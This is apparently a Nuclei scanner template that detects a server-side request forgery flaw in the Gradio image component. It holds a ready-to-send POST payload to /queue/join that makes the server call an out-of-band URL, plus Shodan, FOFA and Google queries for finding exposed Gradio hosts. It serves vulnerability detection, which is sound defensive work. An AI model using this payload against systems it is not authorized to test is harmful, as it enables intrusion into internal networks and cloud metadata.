http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "{\"event_id\":')
    - contains(interactsh_protocol, 'http')
    - contains(content_type, "application/json')
    type: dsl
  raw:
  - 'POST /queue/join? HTTP/1.1

    Host: {{Hostname}}

    content-type: application/json


    {"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}

    '
id: gradio-image-ssrf
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:*:python:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-918
  description: 'A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio
    image component allows an attacker to exploit SSRF using the path value in the
    `/queue/join` endpoint, obtained from the user and expected to be a URL, is used
    to make an HTTP request without sufficient validation checks. This flaw allows
    an attacker to send crafted requests that could lead to unauthorized access to
    the local network or the AWS metadata endpoint, thereby compromising the security
    of internal servers.

    '
  metadata:
    fofa-query:
    - body="__gradio_mode__"
    - title="gradio"
    google-query: intitle:"gradio"
    max-request: 1
    product: gradio
    shodan-query:
    - http.html:"__gradio_mode__"
    - http.title:"gradio"
    vendor: gradio_app
    verified: true
  name: Gradio Image Component - Server-Side Request Forgery
  reference:
  - https://huntr.com/bounties/e9baeed8-868a-4c1b-882c-715ae0f3072f
  severity: high
  tags: cve,cve2024,gradio,ssrf,oast,vuln
